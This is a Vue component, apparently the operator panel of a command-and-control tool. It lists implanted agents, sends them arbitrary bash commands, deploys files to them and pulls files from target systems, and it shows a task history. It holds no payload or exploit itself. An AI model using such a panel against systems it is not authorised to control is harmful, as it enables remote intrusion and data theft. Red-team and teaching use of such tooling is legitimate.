<template lang="pug">
.container
  .row.mt-3: .col-12: QuickCard(
    header='Issue Commands',
    title='Command Dispatcher'
  )
    .mt-3
      label.form-label.d-block(for='commandModeInputGroup') Command Mode:
      #commandModeInputGroup.btn-group(
        role='group',
        aria-label='Command mode options'
      ): template(
        v-for='(option, i) in commandOptions',
        :key='i'
      )
        input.btn-check(
          type='radio',
          name='commandMode',
          autocomplete='off',
          :checked='option === commandMode ? true : false',
          :id='`commandModeInput${i}`',
          @change='onCommandModeSelect(option)'
        )
        label.btn.btn-outline-primary(
          :for='`commandModeInput${i}`',
          v-text='option'
        )
    .mt-3
      label.form-label(for='commandParameterInput') Command / Special Command Arguments
      input#commandParameterInput.form-control(
        :class='{ "is-valid": dirty && formIsValid, "is-invalid": dirty && !formIsValid }',
        type='text',
        v-model='commandParameter',
        aria-describedby='commandParameterInputHelp',
        required,
        @input='formValidate'
      )
      #commandParameterInputHelp.form-text(for='commandParameterInput') Please enter the desired bash-compatible command OR SourcePath DestinationPath of a File to Deploy OR The path of a File on target system you wish to retrieve.
      .invalid-feedback Please enter something (If you're just spawning an agent, enter an integer that hasn't been used yet.)
      .valid-feedback Thanks!

    .mt-3
      label.form-label(for='submitButton') Looking good? Execute!
      button#submitButton.btn.btn-primary.d-block(
        :disabled='!formIsValid',
        type='submit',
        aria-describedby='submitButtonHelp',
        @click='tryCallApi'
      ) SEND IT
      #submitButtonHelp.form-text(for='submitButton') Fair warning, the speed of execution is completely dependant on the rate of check in from agents.

  .row.mt-3
    //- left pane
    .col-6: QuickCard.mb-5(
      header='Active Agents (Implants)',
      title='Select which agents will receive commands:'
    ): ul.list-group.mt-3: template(
      v-for='({ id, tasks }, i) in agents',
      :key='i'
    ): li.list-group-item: .form-check.form-switch
      input.form-check-input(
        type='checkbox',
        :checked='selectedAgents.includes(id)',
        :id='`agentSelectInput${i}`',
        @change='onAgentSelect(id)'
      )
      label.form-check-label(:for='`agentSelectInput${i}`')
        b Agent Id:
        span.ms-1(v-text='id')
        b.ms-2 Tasks:
        span.badge.bg-secondary.ms-1 {{ tasks.length }}

    //- right pane
    .col-6: QuickCard(header='Monitor', title='Command History'): ul.list-group.mt-3
      template(v-for='({ id, command }, i) in tasksSorted', :key='i'): li.list-group-item(
        v-text='`TaskId: ${id} Command: ${command}`'
      )
</template>

<script lang="ts">
import { mapGetters } from 'vuex'
import { defineComponent, defineAsyncComponent } from 'vue'

import { sendCommand, pullCommand, pushCommand, createAgent } from '@/api'

const actionMap = {
  'Debug: Create Agent': (commandParam) => createAgent(commandParam),
  'Direct Bash Command': sendCommand,
  'Special PUSH': pushCommand,
  'Special PULL': pullCommand
}

const commandOptions = Object.keys(actionMap)

const createComparator =
  (key, order = 'asc') =>
  (a, b) => {
    if (
      !Object.prototype.hasOwnProperty.call(a, key) ||
      !Object.prototype.hasOwnProperty.call(b, key)
    ) {
      // property doesn't exist on either object
      return 0
    }

    const varA = typeof a[key] === 'string' ? a[key].toUpperCase() : a[key]
    const varB = typeof b[key] === 'string' ? b[key].toUpperCase() : b[key]

    let comparison = 0

    if (varA > varB) {
      comparison = 1
    } else if (varA < varB) {
      comparison = -1
    }

    return order === 'desc' ? comparison * -1 : comparison
  }

export const CommandView = defineComponent({
  components: {
    QuickCard: defineAsyncComponent(() => import('../components/QuickCard.vue'))
  },
  data: () => ({
    commandParameter: '',
    selectedAgents: [],
    commandMode: 'Direct Bash Command',
    dirty: false,
    formIsValid: false,
    commandOptions
  }),
  computed: {
    ...mapGetters(['agents']),
    tasks() {
      return this.agents.flatMap((a) => a.tasks)
    },
    tasksSorted() {
      return [...this.tasks].sort(createComparator('id', 'desc'))
    }
  },
  methods: {
    tryCallApi() {
      if (this.formIsValid && this.commandMode in actionMap) {
        actionMap[this.commandMode](this.commandParameter, this.selectedAgents)
      } else {
        console.error('Invalid commandMode value:', this.commandMode)
      }
    },
    onCommandModeSelect(mode) {
      this.commandMode = mode
    },
    onAgentSelect(agentId) {
      if (this.selectedAgents.includes(agentId))
        this.selectedAgents = this.selectedAgents.filter((a) => a !== agentId)
      else this.selectedAgents.push(agentId)
    },
    formValidate() {
      this.dirty = true
      this.formIsValid = this.commandParameter.length > 0
    }
  }
})

export { CommandView as default }
</script>
